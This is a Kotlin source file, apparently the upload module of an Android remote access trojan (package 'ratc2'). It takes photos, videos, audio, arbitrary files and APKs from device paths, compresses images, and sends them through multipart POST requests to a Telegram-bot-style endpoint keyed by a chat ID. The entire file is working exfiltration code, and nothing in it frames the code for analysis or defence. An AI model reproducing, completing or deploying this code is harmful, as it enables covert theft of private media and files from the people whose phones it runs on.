package com.spud.ratc2

import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaCodec
import android.media.MediaExtractor
import android.media.MediaFormat
import android.media.MediaMuxer
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.nio.ByteBuffer
import java.util.UUID

object Sender {
    private const val TAG = "SENDER"
    private const val IMG_MAX = 480
    private const val IMG_QUALITY = 55
    private const val VIDEO_MAX_MB = 8L

    fun get(url: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 8000
        c.readTimeout = 40000
        c.setRequestProperty("Connection", "keep-alive")
        return c.inputStream.bufferedReader().readText()
    }

    fun post(url: String, params: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 8000
        c.readTimeout = 15000
        c.requestMethod = "POST"
        c.doOutput = true
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        c.outputStream.write(params.toByteArray())
        return c.inputStream.bufferedReader().readText()
    }

    fun sendDocument(botBase: String, chatId: String, filename: String, content: String): Boolean =
        sendFile(botBase, chatId, "sendDocument", "document", filename, content.toByteArray(Charsets.UTF_8), "text/plain; charset=utf-8")

    fun sendPhoto(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        val data = compressImage(path) ?: return false
        val name = f.name.substringBeforeLast('.') + ".jpg"
        return sendFile(botBase, chatId, "sendPhoto", "photo", name, data, "image/jpeg")
    }

    fun sendVideo(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        // نستخدم الفيديو كما هو إذا صغير
        if (f.length() <= VIDEO_MAX_MB * 1024 * 1024) {
            return sendFile(botBase, chatId, "sendVideo", "video", f.name, f.readBytes(), "video/mp4")
        }
        return false
    }

    fun sendAudio(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        if (f.length() > 30L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendAudio", "audio", f.name, f.readBytes(), guessMime(f.name))
    }

    fun sendAnyFile(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead() || f.length() == 0L) return false
        if (f.length() > 50L * 1024 * 1024) return false
        val lower = f.name.lowercase()
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") || lower.endsWith(".webp")) {
            val data = compressImage(path)
            if (data != null) {
                return sendFile(botBase, chatId, "sendDocument", "document", f.name, data, "image/jpeg")
            }
        }
        return sendFile(botBase, chatId, "sendDocument", "document", f.name, f.readBytes(), guessMime(f.name))
    }

    fun sendApk(botBase: String, chatId: String, path: String, displayName: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        if (f.length() > 50L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendDocument", "document", displayName, f.readBytes(), "application/vnd.android.package-archive")
    }

    private fun compressImage(path: String): ByteArray? {
        return try {
            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(path, opts)
            val w = opts.outWidth; val h = opts.outHeight
            if (w <= 0 || h <= 0) return null
            var scale = 1
            while ((w / scale) > IMG_MAX || (h / scale) > IMG_MAX) scale *= 2
            val opts2 = BitmapFactory.Options().apply { inSampleSize = scale }
            val bmp = BitmapFactory.decodeFile(path, opts2) ?: return null
            val out = if (bmp.width > IMG_MAX || bmp.height > IMG_MAX) {
                val r = minOf(IMG_MAX.toFloat() / bmp.width, IMG_MAX.toFloat() / bmp.height)
                val nw = (bmp.width * r).toInt(); val nh = (bmp.height * r).toInt()
                val s = Bitmap.createScaledBitmap(bmp, nw, nh, true)
                if (s !== bmp) bmp.recycle()
                s
            } else bmp
            val baos = ByteArrayOutputStream()
            out.compress(Bitmap.CompressFormat.JPEG, IMG_QUALITY, baos)
            out.recycle()
            baos.toByteArray()
        } catch (e: Exception) { Log.e(TAG, "compress", e); null }
    }

    private fun guessMime(name: String): String {
        val n = name.lowercase()
        return when {
            n.endsWith(".mp3") -> "audio/mpeg"
            n.endsWith(".m4a") -> "audio/mp4"
            n.endsWith(".wav") -> "audio/wav"
            n.endsWith(".ogg") -> "audio/ogg"
            n.endsWith(".jpg") || n.endsWith(".jpeg") -> "image/jpeg"
            n.endsWith(".png") -> "image/png"
            n.endsWith(".gif") -> "image/gif"
            n.endsWith(".webp") -> "image/webp"
            n.endsWith(".mp4") -> "video/mp4"
            else -> "application/octet-stream"
        }
    }

    private fun sendFile(base: String, chatId: String, endpoint: String, field: String, filename: String, data: ByteArray, mime: String): Boolean {
        return try {
            val boundary = "----Spud" + UUID.randomUUID().toString().replace("-", "")
            val conn = URL("$base/$endpoint").openConnection() as HttpURLConnection
            conn.connectTimeout = 10000
            conn.readTimeout = 90000
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val out: OutputStream = conn.outputStream
            fun w(s: String) { out.write(s.toByteArray(Charsets.UTF_8)) }
            w("--$boundary\r\n")
            w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            w("$chatId\r\n")
            w("--$boundary\r\n")
            w("Content-Disposition: form-data; name=\"$field\"; filename=\"${filename.replace("\"", "")}\"\r\n")
            w("Content-Type: $mime\r\n\r\n")
            out.write(data)
            w("\r\n")
            w("--$boundary--\r\n")
            out.flush(); out.close()
            val code = conn.responseCode
            Log.i(TAG, "$endpoint code=$code size=${data.size}")
            code in 200..299
        } catch (e: Exception) { Log.e(TAG, "$endpoint err", e); false }
    }
}
